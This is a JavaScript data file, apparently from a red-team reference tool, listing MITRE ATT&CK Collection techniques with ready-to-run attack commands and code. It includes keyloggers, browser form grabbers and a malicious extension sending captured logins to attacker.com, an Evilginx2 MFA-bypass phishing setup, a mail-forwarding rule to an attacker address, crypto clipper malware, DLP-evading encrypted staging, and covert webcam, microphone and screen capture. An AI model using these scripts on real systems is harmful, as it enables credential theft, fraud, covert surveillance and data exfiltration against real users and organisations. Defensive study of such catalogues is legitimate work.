export const COLLECTION = {
  id: "collection",
  name: "Collection",
  tacticId: "TA0009",
  subtitle: "Local Data • Network Shares • Email Collection • Input Capture • Screen Capture • Clipboard • Browser Session Hijacking • Man-in-the-Browser • AiTM Collection • Cloud Storage • Data Staging • Archive Collected Data • Automated Collection • Removable Media • Info Repositories • Video Capture • Audio Capture",
  color: "#fbbf24",
  techniques: [
    {
      name: "Data from Local System",
      id: "T1005",
      summary: "File search • document theft • database dump • credential files",
      description: "Collect sensitive data from local system files, databases, and applications",
      tags: ["file collection", "database dump", "documents", "T1005"],
      steps: [
        "Collect sensitive documents (prioritized targeting):\n# Collect strategically — not everything, just the highest-value data\n# Priority order: financials > PII/HR > legal/contracts > source code/IP > strategy docs\n# Windows — robocopy preserves metadata and handles locked files better than xcopy:\n$ robocopy C:\\Users /e /z /xf *.exe *.dll /if *.docx *.xlsx *.pdf *.pptx C:\\Temp\\collect\n# /e: all subdirs, /z: restartable, /xf: exclude, /if: include filter\n# Linux — find by extension:\n$ find /home /root /var/www -name '*.docx' -o -name '*.xlsx' -o -name '*.pdf' 2>/dev/null | xargs cp --parents -t /tmp/collect/\n# --parents: preserves directory structure in destination\n# Prioritize most recently modified (more likely current/relevant):\n$ find /home -mtime -90 \\( -name '*.docx' -o -name '*.xlsx' -o -name '*.pdf' \\) 2>/dev/null | head -500\n# -mtime -90: modified in last 90 days",
        "Database collection:\n$ sqlcmd -S . -Q 'SELECT TOP 1000 * FROM dbo.Users' -o output.txt\n$ mysqldump -u root -pPASS target_db > dump.sql\n$ pg_dump -U postgres target_db > dump.sql\n# Backup entire DB for offline analysis",
        "PowerShell collection script:\n> $collect = @('*.doc*','*.xls*','*.pdf','*.pst','*.kdbx','*.key','*.pem')\n> $dest = 'C:\\Windows\\Temp\\data\\'\n> mkdir $dest -Force\n> foreach ($ext in $collect) {\n>     Get-ChildItem -Path C:\\Users -Recurse -Filter $ext -ErrorAction SilentlyContinue | Copy-Item -Destination $dest\n> }\n# Collect all interesting file types to staging directory",
        "Browser saved passwords:\n$ python3 laZagne.py browsers  # All browsers\n$ python3 laZagne.py all       # All sources\n# Chrome: decrypt DPAPI-protected passwords\n# Firefox: decrypt with key4.db + logins.json",
        "Source code and configuration files:\n$ find / -name '*.tf' -o -name '*.yaml' -o -name 'docker-compose.yml' -o -name '.env' 2>/dev/null\n# Infrastructure code often contains secrets\n$ find / -name '*.git' -type d 2>/dev/null | xargs -I{} git -C {} log --oneline -5\n# Git history may contain removed secrets"
      ]
    },
    {
      name: "Data from Network Shared Drive",
      id: "T1039",
      summary: "SMB shares • NFS • SharePoint • OneDrive • mapped drives",
      description: "Collect data from network shared drives and collaboration platforms",
      tags: ["SMB shares", "SharePoint", "NFS", "T1039"],
      steps: [
        "Enumerate and access network shares:\n$ net use * \\\\server\\share /user:DOMAIN\\user pass\n$ nxc smb 192.168.1.0/24 --shares -u user -p pass\n# Find shares with readable data\n$ nxc smb 192.168.1.100 --spider 'Finance' -u user -p pass --pattern password",
        "Spider shares for sensitive files:\n$ nxc smb 192.168.1.100 --spider-folder / --depth 5 --pattern '.docx .xlsx .pdf .kdbx .pst' -u user -p pass\n# Automated share spidering with file pattern matching",
        "Mass share download:\n$ smbmap -H 192.168.1.100 -u user -p pass -d domain --download 'Finance\\Q4 Report.xlsx'\n$ python3 smbclient.py domain/user:pass@192.168.1.100\n: use Finance\n: recurse\n: mget *\n# Download entire share contents",
        "SharePoint/OneDrive via O365:\n$ python3 o365spray.py --enum-o365 --domain target.com\n$ python3 roadrecon.py -u user@target.com -p pass && roadrecon gather\n# roadrecon: enumerate Azure AD, teams, SharePoint via Graph API\n$ python3 roadtx.py -r http --server SHAREPOINT_SERVER -u user -p pass\n# Download SharePoint documents with authenticated Graph API access",
        "NFS export exploitation:\n$ showmount -e 192.168.1.100\n$ mount -t nfs 192.168.1.100:/export/data /mnt/nfs\n# NFS mounts are accessible by IP - if export allows *\n# mount, ls, cp files"
      ]
    },
    {
      name: "Email Collection",
      id: "T1114",
      summary: "Mailbox export • PST dump • MAPI access • OWA scrape • forwarding rule",
      description: "Collect emails from compromised mailboxes for intelligence and credential hunting",
      tags: ["mailbox export", "PST dump", "MAPI", "T1114"],
      steps: [
        "O365 mailbox export (Microsoft Graph API):\n# Microsoft Graph API provides programmatic access to all mailboxes if you have admin or delegated access\n# Step 1: Obtain access token (with compromised credentials or stolen token)\n$ roadtx gettokens -u user@target.com -p pass  # ROADtools — https://github.com/dirkjanm/ROADtools\n$ roadtx gettokens --device-code  # Device code flow (bypasses password spray detection)\n# Step 2: Enumerate accessible mailboxes (requires Mail.ReadWrite or Mail.Read scope)\n$ roadtx listmailboxes\n# Step 3: Download mail (Graph API search for high-value terms):\n$ curl -H 'Authorization: Bearer ACCESS_TOKEN' \\\n  'https://graph.microsoft.com/v1.0/users/CEO@target.com/messages?$search=\"acquisition\"&$top=50' | jq '.value[].subject'\n# MailSniper alternative (on-prem Exchange):\n> Import-Module MailSniper.ps1  # https://github.com/dafthack/MailSniper\n> Invoke-GlobalMailSearch -ExchHostname mail.target.com -UserList users.txt -OutputCsv mails.csv",
        "Exchange admin mailbox export:\n> New-MailboxExportRequest -Mailbox administrator -FilePath '\\\\server\\share\\admin.pst'\n> Get-MailboxExportRequest\n# Exchange admin can export any mailbox to PST\n$ python3 privexchange.py -ah attacker -u user -p pass -d domain.com mail.target.com",
        "Offline PST file access:\n$ readpst victim.pst -o output_dir/\n# readpst: converts PST to mbox/emlx format\n# Grep for keywords: password, invoice, contract, credentials\n$ grep -r 'password\\|secret' output_dir/",
        "Set up email forwarding (Graph API):\n$ curl -X POST 'https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules' \\\n  -H 'Authorization: Bearer STOLEN_TOKEN' -H 'Content-Type: application/json' \\\n  -d '{\"displayName\":\"Fwd\",\"isEnabled\":true,\"actions\":{\"forwardTo\":[{\"emailAddress\":{\"address\":\"attacker@gmail.com\"}}]}}'\n# Create forwarding rule via Microsoft Graph API\n# All future emails forwarded to attacker",
        "Email search for credentials (MailSniper):\n> Import-Module MailSniper.ps1  # https://github.com/dafthack/MailSniper\n> Invoke-SelfSearch -Mailbox user@target.com -ExchHostname mail.target.com -Terms 'password,credential,secret' -OutputCsv results.csv\n# Search mailbox for password-related emails"
      ]
    },
    {
      name: "Input Capture",
      id: "T1056",
      summary: "Keylogger • form grabber • API hooking • logon credential capture",
      description: "Capture keystrokes, form input, and credentials as users interact with systems",
      tags: ["keylogger", "form grabber", "API hooking", "T1056"],
      steps: [
        "Windows API keylogger (SetWindowsHookEx):\n> HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);\n> LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {\n>     KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*)lParam;\n>     // Log key to file or send to C2\n>     return CallNextHookEx(hook, nCode, wParam, lParam);\n> }\n# Global keyboard hook: captures all keystrokes system-wide",
        "PowerShell keylogger:\n> $Hooks = New-Object -TypeName System.Windows.Forms.Timer\n> $Hooks.Interval = 100\n> $Hooks.Add_Tick({ $KeyState = [System.Windows.Forms.Control]::ModifierKeys; ... })\n# Polling keyboard state every 100ms",
        "Browser form grabber:\n# Inject JavaScript into every page via malicious extension\n> document.addEventListener('submit', function(e) {\n>     var data = new FormData(e.target);\n>     fetch('https://attacker.com/grab', {method:'POST', body: JSON.stringify(Object.fromEntries(data))});\n> });\n# Captures all form submissions including login forms",
        "Credential capture at authentication dialogs:\n# Hook CredUIPromptForWindowsCredentials\n# Intercept SSPI authentication prompts\n# Captures network authentication credentials\n# PowerShell keylogger via polling:\n> while($true){ [void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); $key=[System.Windows.Forms.Control]::MouseButtons; Start-Sleep -Milliseconds 100 }",
        "Linux terminal keylogger:\n> // Inject into bash via LD_PRELOAD\n> // Hook readline library functions\n> char* (*orig_readline)(const char*) = dlsym(RTLD_NEXT, \"readline\");\n> char* readline(const char* prompt) {\n>     char* input = orig_readline(prompt);\n>     if (input) log_keystroke(input);\n>     return input;\n> }\n# Captures everything typed in bash terminal"
      ]
    },
    {
      name: "Screen Capture",
      id: "T1113",
      summary: "Screenshot • screen recording • VNC • RDP shadowing • video capture",
      description: "Capture screenshots and screen recordings to collect displayed sensitive information",
      tags: ["screenshot", "screen recording", "VNC shadow", "T1113"],
      steps: [
        "PowerShell screenshot:\n> Add-Type -AssemblyName System.Windows.Forms\n> $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds\n> $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)\n> $gfx = [System.Drawing.Graphics]::FromImage($bmp)\n> $gfx.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)\n> $bmp.Save('C:\\Windows\\Temp\\screenshot.png')\n# Takes screenshot, saves to temp folder",
        "Automated timed screenshots:\n> while($true) {\n>     # Take screenshot code here\n>     $bmp.Save(\"C:\\Temp\\sc_$(Get-Date -f 'yyyyMMdd_HHmmss').png\")\n>     Start-Sleep 300  # Every 5 minutes\n> }\n# Continuous monitoring for sensitive data display",
        "RDP session shadowing:\n$ query session /server:192.168.1.100\n$ mstsc /shadow:<SESSION_ID> /server:192.168.1.100 /noConsentPrompt\n# Shadow RDP session - view user's screen without them knowing\n# /noConsentPrompt bypasses consent dialog (requires admin GPO)",
        "VNC screen capture:\n$ vncviewer 192.168.1.100\n# If VNC is running without auth or with known password\n# Record: vncviewer -record recording.log 192.168.1.100",
        "Linux screen capture:\n$ scrot -u screenshot.png  # Active window\n$ import -window root screen.png  # ImageMagick full screen\n$ ffmpeg -f x11grab -r 5 -s 1920x1080 -i :0.0 recording.mp4\n# 5 FPS screen recording - stores as MP4"
      ]
    },
    {
      name: "Clipboard Data",
      id: "T1115",
      summary: "Clipboard monitoring • password manager theft • crypto address swap",
      description: "Collect or modify clipboard contents to steal passwords, keys, and sensitive data",
      tags: ["clipboard", "password manager", "crypto swap", "T1115"],
      steps: [
        "Monitor clipboard in Windows:\n> Add-Type -AssemblyName PresentationCore\n> while ($true) {\n>     $clip = [Windows.Clipboard]::GetText()\n>     if ($clip -ne $prev) {\n>         Add-Content C:\\Temp\\clip.txt \"$(Get-Date): $clip\"\n>         $prev = $clip\n>     }\n>     Start-Sleep 1\n> }\n# Log all clipboard changes - captures copied passwords, keys",
        "Windows API clipboard access:\n> OpenClipboard(NULL);\n> HANDLE hData = GetClipboardData(CF_TEXT);\n> char* text = (char*)GlobalLock(hData);\n> // text contains clipboard content\n> GlobalUnlock(hData);\n> CloseClipboard();\n# Read clipboard content from C code",
        "Cryptocurrency address swap (clipper malware):\n> // Monitor clipboard for crypto address patterns\n> Regex btcRegex = new Regex(@\"[13][a-km-zA-HJ-NP-Z1-9]{25,34}\");\n> if (btcRegex.IsMatch(clipboardText)) {\n>     SetClipboard(attacker_btc_address);  // Replace with attacker's address\n> }\n# Victim pastes attacker's address instead of intended recipient",
        "Linux clipboard access:\n$ xclip -selection clipboard -o  # Read clipboard\n$ xclip -selection primary -o    # Read selection buffer\n$ xdotool getactivewindow type $(xclip -o)  # Type clipboard content\n# Monitor continuously:\n$ while true; do xclip -selection clipboard -o 2>/dev/null; sleep 2; done",
        "Extract 1Password / KeePass clipboard:\n# Password managers copy to clipboard on request\n# Race condition: capture clipboard immediately after copy\n# KeePass: monitor for password copy event then read clipboard"
      ]
    },
    {
      name: "Adversary-in-the-Middle - Collection",
      id: "T1557.collection",
      summary: "AiTM • HTTP interception • credential collection • session hijack",
      description: "Position between clients and servers to intercept and collect transmitted data",
      tags: ["AiTM", "HTTP interception", "session hijack", "T1557"],
      steps: [
        "Evilginx2 AiTM for session token collection (MFA bypass):\n# AiTM (Adversary-in-the-Middle) proxies the REAL login page — victim sees legitimate Microsoft login\n# Evilginx sits between victim and Microsoft, capturing the session cookie AFTER MFA is completed\n# This bypasses MFA: attacker steals the authenticated session cookie, not the password\n# Session cookie is valid for the browser session (hours to days) — use immediately\n$ evilginx2\n> config domain attacker.com  # Your domain (needs DNS configured)\n> config ip 1.2.3.4           # Your server IP\n> phishlets hostname microsoft attacker.com  # Configure phishlet\n> phishlets enable microsoft\n> lures create microsoft       # Generate phishing URL to send victim\n# After victim authenticates: check sessions for captured cookies:\n> sessions\n> sessions 1  # View session details with captured tokens\n# Import stolen session into browser with Cookie Editor or use with Requests library\n# Works against: Microsoft 365, Google Workspace, GitHub, Twitter, LinkedIn",
        "mitmproxy for HTTP/HTTPS collection:\n$ mitmproxy -p 8080 --mode transparent\n# Transparent proxy: intercept traffic without configuration\n# All HTTP data logged including POST bodies with credentials",
        "SSL stripping and downgrade:\n$ bettercap -eval 'set arp.spoof.targets 192.168.1.100; arp.spoof on; net.sniff on; ssl.strip.hosts target.com'\n# Downgrade HTTPS → HTTP\n# Capture cleartext credentials",
        "Internal AiTM via ARP spoofing:\n$ arpspoof -i eth0 -t victim_ip gateway_ip\n$ arpspoof -i eth0 -t gateway_ip victim_ip\n$ echo 1 > /proc/sys/net/ipv4/ip_forward\n$ tcpdump -i eth0 -w captured.pcap\n# Full traffic capture between victim and gateway",
        "Collect from AiTM captures:\n$ dsniff -p captured.pcap  # Extract passwords from pcap\n$ tshark -r captured.pcap -Y http.request.method==POST -T fields -e http.file_data\n# Extract form submissions including credentials"
      ]
    },
    {
      name: "Data from Cloud Storage",
      id: "T1530",
      summary: "S3 bucket • Azure Blob • Google Drive • cloud object theft",
      description: "Access and collect data stored in cloud storage services",
      tags: ["S3 bucket", "Azure Blob", "cloud storage", "T1530"],
      steps: [
        "AWS S3 bucket enumeration and collection:\n$ aws s3 ls s3://target-bucket --no-sign-request  # Public bucket\n$ aws s3 ls s3://target-bucket  # With compromised credentials\n$ aws s3 sync s3://target-bucket /tmp/loot/ --no-sign-request\n$ python3 s3scanner.py --bucket target-company --dump",
        "Azure Blob Storage collection:\n$ az storage blob list --container-name data --account-name targetaccount\n$ az storage blob download-batch --destination /tmp/loot --source data --account-name targetaccount\n$ azcopy copy 'https://targetaccount.blob.core.windows.net/container/SAS_TOKEN' /tmp/loot --recursive",
        "Google Cloud Storage collection:\n$ gsutil ls gs://target-bucket\n$ gsutil cp -r gs://target-bucket/* /tmp/loot/\n$ gsutil acl get gs://target-bucket  # Check public access",
        "Discover public cloud storage:\n$ python3 S3Scanner.py --bucket-file company-names.txt --dump-all\n$ gobuster s3 -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt\n# Common patterns: company-backup, company-prod, company-logs",
        "Cloud database collection:\n$ aws rds describe-db-instances\n$ aws rds describe-db-snapshots --owner-type public\n# Public RDS snapshots: create snapshot, share publicly, access from attacker account\n$ aws rds restore-db-instance-from-db-snapshot --db-instance-identifier loot --db-snapshot-identifier TARGET_SNAPSHOT_ARN"
      ]
    },
    {
      name: "Data Staged",
      id: "T1074",
      summary: "Local staging • encrypted archive • compression • staging server",
      description: "Stage collected data before exfiltration to avoid detection",
      tags: ["staging", "archive", "compression", "T1074"],
      steps: [
        "Create encrypted archive for staging (DLP evasion):\n# DLP (Data Loss Prevention) tools inspect file content during transfer\n# Encrypting before staging ensures DLP sees only encrypted bytes — cannot classify or block\n# 7z with header encryption (filenames also hidden from inspection):\n$ 7z a -mhe=on -mx=9 -p'StrongPass123!' staged.7z /tmp/collected/\n# -mhe=on: encrypt headers (filenames hidden), -mx=9: max compression\n# This means even metadata (filenames, sizes) are encrypted — can't determine content from listing\n# zip alternative (weaker but widely compatible):\n$ zip -r -e --password='Pass123' staged.zip /tmp/data/\n# Linux: pipe through OpenSSL AES-256 for strong encryption:\n$ tar czf - /tmp/data | openssl enc -aes-256-cbc -pbkdf2 -k 'Pass' > staged.tar.gz.enc\n# Test extraction before exfil:\n$ 7z t staged.7z -p'StrongPass123!'",
        "Split large archives:\n$ 7z a -v100m staged.7z /data/large_file\n# Split into 100MB chunks for gradual exfil\n$ split -b 10M staged.7z staged_part_\n# 10MB splits avoid triggering large upload alerts",
        "Stage on compromised intermediate host:\n$ scp collected_data.tar.gz internal_server:/tmp/\n# Use internal server as staging point\n# Exfil from staging server rather than directly from target\n# Less detection - internal traffic + staged upload is separate from collection",
        "Store in cloud service:\n$ rclone copy /tmp/collected gdrive:Backups/\n$ aws s3 cp data.zip s3://attacker-staging-bucket/\n# Cloud storage: hard to block without broad impact\n# Encrypt before upload",
        "Temporary staging locations:\n$ cp -r /home/user/Documents /tmp/.cache/  # Dot file hides in /tmp\n$ copy C:\\Users\\user\\Documents C:\\Windows\\Temp\\.hidden\\  # Hidden in Windows temp\n# Avoid staging in obvious locations\n# Delete staging area after successful exfiltration"
      ]
    },
    {
      name: "Data from Information Repositories",
      id: "T1213",
      summary: "SharePoint • Confluence • Jira • Git repos • wikis • knowledge bases",
      description: "Collect sensitive information from collaboration platforms and internal knowledge repositories",
      tags: ["SharePoint", "Confluence", "Jira", "Git", "T1213"],
      steps: [
        "SharePoint document collection via Graph API:\n$ roadtx gettokens -u user@target.com -p pass  # ROADtools\n$ curl -H 'Authorization: Bearer TOKEN' 'https://graph.microsoft.com/v1.0/sites/root/drives' | jq '.value[].id'\n$ curl -H 'Authorization: Bearer TOKEN' 'https://graph.microsoft.com/v1.0/drives/DRIVE_ID/root/children' | jq '.[].name'\n# Enumerate and download SharePoint documents via Graph API",
        "Confluence wiki scraping:\n$ curl -u user:pass 'https://confluence.target.com/rest/api/space' | jq '.results[].key'\n$ curl -u user:pass 'https://confluence.target.com/rest/api/content?spaceKey=IT&type=page&limit=1000'\n# Enumerate all Confluence pages\n# Look for: passwords, architecture docs, runbooks",
        "Jira issue collection:\n$ curl -u user:pass 'https://jira.target.com/rest/api/2/search?jql=text~password&maxResults=100'\n# Search Jira issues for keyword 'password'\n$ curl -u user:pass 'https://jira.target.com/rest/api/2/project' | jq '.[].key'\n# Enumerate all Jira projects",
        "Git repository credential harvesting:\n$ trufflehog filesystem /mnt/repos/ --only-verified\n$ git log --all --oneline | head -20\n$ git diff HEAD~1 HEAD -- '*.env' '*.key' '*.conf'\n# Search git history for committed secrets",
        "Slack/Teams message collection:\n# Slack: use compromised user token to read messages\n$ curl -H 'Authorization: Bearer xoxp-TOKEN' 'https://slack.com/api/conversations.history?channel=CHANNEL_ID'\n# Teams: use Graph API to read channel messages\n$ curl -H 'Authorization: Bearer ACCESS_TOKEN' 'https://graph.microsoft.com/v1.0/teams/TEAM_ID/channels/CHANNEL_ID/messages'\n# Sensitive data shared in chat: credentials, architecture, PII"
      ]
    },
    {
      name: "Video Capture",
      id: "T1125",
      summary: "Webcam recording • screen video • conference recording • surveillance",
      description: "Capture video from webcam or screen for intelligence gathering",
      tags: ["webcam", "screen recording", "video capture", "T1125"],
      steps: [
        "Windows webcam capture:\n$ python3 -c \"\nimport cv2\ncap = cv2.VideoCapture(0)\nfourcc = cv2.VideoWriter_fourcc(*'mp4v')\nout = cv2.VideoWriter('/tmp/capture.mp4', fourcc, 20.0, (640,480))\nfor _ in range(300): _, frame = cap.read(); out.write(frame)\ncap.release(); out.release()\n\"",
        "Linux webcam recording:\n$ ffmpeg -f v4l2 -video_size 1280x720 -i /dev/video0 -t 60 /tmp/capture.mp4\n$ streamer -c /dev/video0 -t 00:01:00 /tmp/recording.avi\n# Record 60 seconds of webcam footage",
        "macOS screen and camera recording:\n$ python3 -c \"\nimport subprocess\nsubprocess.Popen(['screencapture', '-V', '60', '/tmp/screen.mp4'])\n\"",
        "PowerShell webcam capture:\n> Add-Type -AssemblyName System.Windows.Forms\n> $capture = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds\n> # Use WIA or DirectShow for webcam\n> $filter = New-Object -ComObject 'WIA.DeviceManager'\n> $device = $filter.DeviceInfos.Item(1).Connect()\n# WIA-based image/video capture",
        "Conference meeting recording:\n# Silently record ongoing Teams/Zoom meetings\n# Use virtual audio/video driver to intercept streams\n# Or: inject into meeting client process\n# Target: M&A discussions, board meetings, strategy calls"
      ]
    },
    {
      name: "Archive Collected Data",
      id: "T1560",
      summary: "7zip • tar • zip • encrypt archive • split for exfil • compress",
      description: "Archive and optionally encrypt collected data to compress it and prepare for exfiltration",
      tags: ["7zip", "tar", "archive", "encryption", "T1560"],
      steps: [
        "Create encrypted 7z archive:\n$ 7z a -mhe=on -p'StrongPassphrase123!' -mx=9 loot.7z /tmp/collected/\n# -mhe=on: encrypt headers (filenames hidden)\n# -mx=9: maximum compression\n# Password-protected: contents invisible without password",
        "Split archive for chunked exfil:\n$ 7z a -v50m loot.7z /data/large_collection/\n# Creates loot.7z.001, .002 etc. — each 50MB\n$ split -b 10M loot.tar.gz loot_part_\n# Split by byte size for rate-limited exfil channels",
        "Tar with gzip compression (Linux):\n$ tar czf /tmp/loot.tar.gz --exclude='*.log' /home/user/Documents /etc/passwd /etc/shadow\n# Compress multiple directories into single archive\n$ tar czf - /sensitive/ | openssl enc -aes256 -pbkdf2 -pass pass:Secret > loot.tar.gz.enc\n# Pipe through OpenSSL AES encryption",
        "PowerShell archive creation:\n> Compress-Archive -Path C:\\Users\\*\\Documents -DestinationPath C:\\Temp\\loot.zip\n> Add-Type -Assembly System.IO.Compression.FileSystem\n> [System.IO.Compression.ZipFile]::CreateFromDirectory('C:\\collect\\', 'C:\\Temp\\loot.zip')\n# Built-in PowerShell — no external tool needed",
        "Base64 encode for in-band transfer:\n$ base64 /tmp/loot.tar.gz > /tmp/loot.b64\n$ cat /tmp/loot.b64 | tr -d '\\n' | split -b 500 - chunk_\n# Encode binary as ASCII for text-only channels\n# Useful for pastebins, DNS, HTTP parameter exfil"
      ]
    },
    {
      name: "Automated Collection",
      id: "T1119",
      summary: "Mass file collection • keyword search • automated harvest • spider scripts",
      description: "Use automated scripts to systematically collect data matching criteria from across the environment",
      tags: ["automated collection", "mass harvest", "keyword search", "T1119"],
      steps: [
        "Automated keyword-based document collection (PowerShell):\n> $keywords = @('password','confidential','secret','contract','acquisition','salary','strategic')\n> $extensions = @('*.doc*','*.xls*','*.pdf','*.ppt*','*.txt','*.csv')\n> $dest = 'C:\\Windows\\Temp\\.data\\'\n> New-Item $dest -ItemType Directory -Force | Out-Null\n> foreach ($ext in $extensions) {\n>     Get-ChildItem C:\\Users -Recurse -Filter $ext -EA SilentlyContinue | ForEach {\n>         $content = Get-Content $_ -Raw -EA SilentlyContinue\n>         if ($keywords | Where { $content -match $_ }) { Copy-Item $_ $dest }\n>     }\n> }",
        "Linux automated collection script:\n$ cat collect.sh\n#!/bin/bash\nDEST=/tmp/.sysbackup\nmkdir -p $DEST\n# Collect by file type\nfind /home /root /var/www -name '*.key' -o -name '*.pem' -o -name '.env' -o -name 'credentials' 2>/dev/null | xargs cp -t $DEST/\n# Collect recent modifications\nfind /home -mtime -30 -type f -name '*.docx' 2>/dev/null | xargs cp -t $DEST/\necho 'Collection complete'",
        "Grep for credentials across filesystem:\n$ grep -rn 'password\\|passwd\\|api_key\\|secret\\|token\\|bearer' \\\n  /var/www /opt /etc /home \\\n  --include='*.conf' --include='*.ini' --include='*.env' --include='*.yml' \\\n  -l 2>/dev/null | xargs cp -t /tmp/findings/\n# Copy all files containing credential keywords",
        "Mass network share spider:\n$ nxc smb 192.168.1.0/24 -u user -p pass -M spider_plus --share 'C$' -o EXCLUDE_EXTS='exe,dll,sys'\n# Spider every SMB share on the network\n# Captures: Word docs, Excel, PDFs, TXT, XML\n# Output: JSON with all discovered files",
        "Automated database dumping:\n$ cat auto_dump.sh\nfor host in $(cat db_hosts.txt); do\n  mysqldump -h $host -u root -p'PASS' --all-databases 2>/dev/null | gzip > /tmp/$host.sql.gz\n  pg_dump -h $host -U postgres --all 2>/dev/null | gzip > /tmp/$host.pg.gz\ndone\n# Dump all databases on discovered DB servers"
      ]
    },
    {
      name: "Data from Removable Media",
      id: "T1025",
      summary: "USB collection • removable drive • portable media theft",
      description: "Collect data from removable media devices inserted into compromised systems",
      tags: ["USB", "removable media", "portable drive", "T1025"],
      steps: [
        "Monitor for USB drive insertion (Windows):\n> $watcher = New-Object System.Management.ManagementEventWatcher(\n>     \"SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2\")\n> $watcher.EventArrived.Add_EventArrived({\n>     $drive = $event.SourceEventArgs.NewEvent.DriveName\n>     Get-ChildItem \"${drive}:\\\" -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination 'C:\\Temp\\usb_collect\\'\n> })\n> $watcher.Start()\n# Auto-copies files from any USB drive inserted",
        "Linux USB auto-collection via udev:\n$ cat /etc/udev/rules.d/99-usb-collect.rules\nACTION==\"add\", SUBSYSTEM==\"usb\", DRIVER==\"usb-storage\", RUN+=\"/tmp/collect_usb.sh\"\n# Triggered when USB storage is plugged in\n$ cat /tmp/collect_usb.sh\n#!/bin/bash\nsleep 3\nmount /dev/sdb1 /mnt/usb 2>/dev/null\ncp -r /mnt/usb/* /tmp/.usb_loot/\numount /mnt/usb",
        "Historical USB data recovery:\n# Files may remain in MFT even after deletion from USB\n$ strings /dev/sdb | grep -E '\\.(docx|pdf|xlsx|pptx)'\n$ foremost -i /dev/sdb -o /tmp/recovered -t doc,pdf,xls\n# Foremost: file carving from raw disk image\n$ volatility --profile=Win10x64 -f memdump.raw filescan | grep -i 'usb\\|removable'",
        "Identify connected USB history:\n$ reg query HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR /s\n# Historical USB connections - device names and dates\n$ Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\\*\\* | Select FriendlyName,HardwareID\n# Reveals what USB devices have been used - find physical media holders",
        "Data theft via BadUSB (attacker-inserted device):\n# Pre-loaded USB rubber ducky or Bash Bunny\n# Auto-copies target files when inserted\n# C: Users/Documents → USB\n# Triggered by HID keystroke injection or autorun"
      ]
    },
    {
      name: "Browser Session Hijacking",
      id: "T1185",
      summary: "Browser in the middle • cookie extraction • extension abuse • Man-in-the-Browser",
      description: "Collect sensitive data by abusing browser sessions, extensions, and in-browser man-in-the-middle positioning",
      tags: ["browser hijack", "cookie theft", "extension abuse", "T1185"],
      steps: [
        "Man-in-the-Browser via malicious extension:\n# Deploy extension via GPO, side-loading, or social engineering\n# Extension intercepts all form submissions:\n> chrome.webRequest.onBeforeRequest.addListener(\n>   function(details) {\n>     if (details.method === 'POST') {\n>       fetch('https://attacker.com/grab', {method:'POST',body:details.requestBody});\n>     }\n>   }, {urls:['<all_urls>']}, ['requestBody']\n> );\n# Captures: login credentials, form data, payment info",
        "Live browser cookie extraction (running process):\n$ SharpChrome.exe cookies /format:json\n$ python3 HackBrowserData.py -b chrome -f cookie -o /tmp/\n# Extract from running Chrome — no restart needed\n# DPAPI decryption using current user session key\n# Captures: session cookies, auth tokens, refresh tokens",
        "Remote debugging protocol abuse:\n# Chrome launched with --remote-debugging-port=9222\n$ curl http://localhost:9222/json  # List open tabs\n# Attach to DevTools protocol via WebSocket:\n$ python3 -c \"\nimport websocket, json\nws = websocket.create_connection('ws://localhost:9222/json')\nws.send(json.dumps({'id':1,'method':'Network.getAllCookies'}))\nprint(ws.recv())\n\"\n# Read cookies, local storage, execute JS in any tab context",
        "Windows Credential Provider hijacking:\n# Target: Edge/Chrome using Windows Hello / SSO\n# WAM (Web Account Manager) tokens for M365 in LSASS:\n# Use AADInternals to extract WAM tokens:\n> Import-Module AADInternals  # https://github.com/Gerenios/AADInternals\n> Get-AADIntAccessTokenForMSGraph\n# WAM tokens → access O365 without username/password\n# Works on Entra ID-joined devices",
        "Browser local storage extraction:\n$ find ~/.config/google-chrome -name 'Local Storage' -type d\n$ sqlite3 ~/.config/google-chrome/Default/Local\\ Storage/leveldb/*.ldb .dump 2>/dev/null | grep -Ei 'token|auth|session|key'\n# Local storage contains: JWT tokens, API keys, session data\n# Firefox: ~/.mozilla/firefox/PROFILE/webappsstore.sqlite\n$ sqlite3 webappsstore.sqlite 'SELECT key,value FROM webappsstore2 LIMIT 100'"
      ]
    },
    {
      name: "Audio Capture",
      id: "T1123",
      summary: "Microphone recording • VoIP intercept • room surveillance",
      description: "Capture audio from device microphones for intelligence gathering",
      tags: ["microphone", "audio recording", "room surveillance", "T1123"],
      steps: [
        "Windows microphone capture:\n> var waveIn = new WaveInEvent();\n> waveIn.DeviceNumber = 0;\n> waveIn.WaveFormat = new WaveFormat(44100, 1);\n> var writer = new WaveFileWriter(\"C:\\\\Temp\\\\audio.wav\", waveIn.WaveFormat);\n> waveIn.DataAvailable += (s, e) => writer.Write(e.Buffer, 0, e.BytesRecorded);\n> waveIn.StartRecording();\n# Records from default microphone to WAV file",
        "Linux audio capture:\n$ arecord -D default -f cd -d 60 -t wav /tmp/recording.wav\n# Record 60 seconds from default microphone\n$ arecord -D plughw:1,0 -f S16_LE -r 44100 -c 2 /tmp/recording.wav\n# Specify specific device",
        "macOS audio capture:\n$ SoundRecorder  # Built-in tool\n$ swift -e '\nimport AVFoundation\nlet rec = AVAudioRecorder(url: URL(fileURLWithPath: \"/tmp/rec.m4a\"), settings: [:])\nrec.record()'\n# Swift audio recording on macOS",
        "VoIP traffic interception:\n$ tcpdump -i eth0 -w voip.pcap 'tcp port 5060 or udp port 5004 or udp port 5005'\n# Capture SIP signaling (5060) and RTP audio (5004/5005)\n$ nmap -p 5060,5061 -sV 192.168.1.0/24\n# Scan for SIP devices/services on network\n# Extract RTP audio from pcap with tshark and sox:\n$ tshark -r voip.pcap -Y rtp -T fields -e rtp.payload | xxd -r -p | sox -t raw -r 8000 -b 8 -c 1 -e u-law - out.wav",
        "Corporate meeting audio (Teams/Zoom):\n# Install malicious extension in browser that records audio from meetings\n# Or: compromise user's machine, use microphone API silently\n# Target: executive meetings, board calls, M&A discussions"
      ]
    }
